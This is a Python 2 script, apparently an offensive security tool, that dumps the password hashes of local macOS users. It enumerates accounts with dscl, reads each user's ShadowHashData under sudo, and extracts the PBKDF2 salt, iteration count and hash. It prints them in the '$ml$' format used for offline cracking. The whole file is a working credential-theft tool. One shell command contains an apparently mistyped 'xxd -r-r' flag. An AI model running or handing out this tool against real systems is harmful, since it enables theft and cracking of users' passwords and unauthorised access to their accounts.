# !/usr/bin/python
# Script by Jesse Nebling (@bashexplode)

import subprocess
import xml.etree.ElementTree as ET
import base64
import sys

class HashExtractor:
    def __init__(self):
        self.verbose = False
        self.users = []
        default_users = ['_amavisd', '_analyticsd', '_appleevents', '_applepay', '_appowner', '_appserver', '_appstore',
                         '_ard', '_assetcache', '_astris', '_atsserver', '_avbdeviced', '_calendar', '_captiveagent',
                         '_ces', '_clamav', '_cmiodalassistants', '_coreaudiod', '_coremediaiod', '_ctkd', '_cvmsroot',
                         '_cvs', '_cyrus', '_datadetectors', '_devdocs', '_devicemgr', '_displaypolicyd', '_distnote',
                         '_dovecot', '_dovenull', '_dpaudio', '_eppc', '_findmydevice', '_fpsd', '_ftp',
                         '_gamecontrollerd', '_geod', '_hidd', '_iconservices', '_installassistant', '_installer',
                         '_jabber', '_kadmin_admin', '_kadmin_changepw', '_krb_anonymous', '_krb_changepw',
                         '_krb_kadmin', '_krb_kerberos', '_krb_krbtgt', '_krbfast', '_krbtgt', '_launchservicesd',
                         '_lda', '_locationd', '_lp', '_mailman', '_mbsetupuser', '_mcxalr', '_mdnsresponder',
                         '_mobileasset', '_mysql', '_netbios', '_netstatistics', '_networkd', '_nsurlsessiond',
                         '_nsurlstoraged', '_ondemand', '_postfix', '_postgres', '_qtss', '_reportmemoryexception',
                         '_sandbox', '_screensaver', '_scsd', '_securityagent', '_serialnumberd', '_softwareupdate',
                         '_spotlight', '_sshd', '_svn', '_taskgated', '_teamsserver', '_timed', '_timezone', '_tokend',
                         '_trustevaluationagent', '_unknown', '_update_sharing', '_usbmuxd', '_uucp', '_warmd',
                         '_webauthserver', '_windowserver', '_www', '_wwwproxy', '_xserverdocs', 'daemon', 'nobody', '']
        if self.verbose:
            print("[*] Pulling user list with dscl . -list /Users")
        pullusers = subprocess.Popen(['dscl', '.', '-list', '/Users'], stdout=subprocess.PIPE)
        allusers = pullusers.stdout.read()
        allusers = allusers.split()
        for user in allusers:
            if user not in default_users:
                self.users.append(str(user))
        if self.verbose:
            print("[+] System users are: " + ','.join(self.users))
            print("[*] Extracting hashes for identified users.")
        self.extract_password_hashes()

    # adding directory services output for shadow hash data
    def get_shadowhashdata(self, user):
        cmd = "sudo dscl . -read /Users/{}".format(user) + " ShadowHashData | sed 's/dsAttrTypeNative:ShadowHashData://' | tr -dc 0-9a-f | xxd -r-r -p | plutil -convert xml1 - -o - "
        ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        result = ps.communicate()[0]
        return result

    # in the new versions of macOS there are additional data sets in the XML file, so need to pull the first child
    def parse_plist(self, plist_str, user):
        root = ET.fromstring(plist_str)
        entropy = []
        iterations = []
        salt = []
        for child in root.findall(".//data[1]"):
            entropy.append(child.text.replace(" ", "").strip())
        entropy = ''.join(entropy[0].split())

        for child in root.findall(".//integer[1]"):
            iterations.append(child.text.replace(" ", "").strip())
        iterations = ''.join(iterations[0].split())

        for child in root.findall(".//data[2]"):
            salt.append(child.text.replace(" ", "").strip())
        salt = ''.join(salt[0].split())

        # base64 decode entropy and salt
        entropy = self.b64_to_hex(entropy)
        salt = self.b64_to_hex(salt)

        # truncate hash because of garbage after 128 chars
        if len(entropy) > 128:
            entropy = entropy[0:128]

        return {
            "entropy": entropy,
            "iterations": iterations,
            "salt": salt
        }

    def b64_to_hex(self, string):
        stringRaw = base64.b64decode(string)
        return stringRaw.encode("hex")

    # Adding functionality to extract user hashes for macOS 10.13 and 10.14 - currently no way to get root hash
    def extract_password_hashes(self):
        hashes = []
        for user in self.users:
            if self.verbose:
                if "root" in user:
                    continue
                else:
                    print("[*] Pulling " + user + "'s hash with dscl . -read /Users/" + user + " ShadowHashData | sed 's/dsAttrTypeNative:ShadowHashData://' | tr -dc 0-9a-f | xxd -r-r -p | plutil -convert xml1 - -o - ")
            shadowhashdata = self.get_shadowhashdata(user)
            try:
                hash_components = self.parse_plist(shadowhashdata, user)
                formatted_hash = "$ml$" + hash_components["iterations"] + "$" + hash_components["salt"] + "$" + hash_components["entropy"]
                formatted_hash = formatted_hash.strip()
                hashes.append("{}:{}".format(user, formatted_hash))
            except:
                if self.verbose:
                    if "root" in user:
                        continue
                    else:
                        print("[-] Something went wrong trying to extract {}'s password hash!".format(user))
        for hash in hashes:
            print hash

        return hashes

if __name__ == "__main__":
    try:
        HashExtractor()
    except KeyboardInterrupt:
        print("You killed it.")
        sys.exit()
